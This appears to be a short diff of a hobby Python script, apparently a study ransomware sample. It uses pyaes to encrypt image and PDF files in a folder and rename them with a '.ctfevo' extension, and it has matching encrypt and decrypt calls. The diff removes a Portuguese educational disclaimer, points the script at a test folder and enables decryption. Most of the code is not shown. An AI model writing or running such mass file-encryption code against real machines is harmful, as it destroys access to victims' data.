@@ -1,17 +1,12 @@
-"""_________________________________________________________________________________
-ESTE CODIGO TEM COMO FINALIDADE MEUS ESTUDOS NA AREA DE SEGURANÇA DA INFORMAÇÃO.
-PORFAVOR NÃO USA-LO DE MANEIRA ILEGAL.
-_________________________________________________________________________________"""
-
 import os
 import glob
 import pyaes
 from pathlib import Path
 import ctypes
 
-type_archive = ["*.png"]
+type_archive = ["*.png, *pdf"]
 type_crypto = ["*.ctfevo"]
-desktop = "C:\\Users\\leona\\OneDrive\\Pictures\\Capturas de tela"
+desktop = "C:\\test"
 os.chdir(desktop)
 
 # cripritografando toda a maquina.
@@ -68,4 +63,4 @@ def decript():
 
 if __name__ == '__main__':
     criptation()
-    #decript()
+    decript()
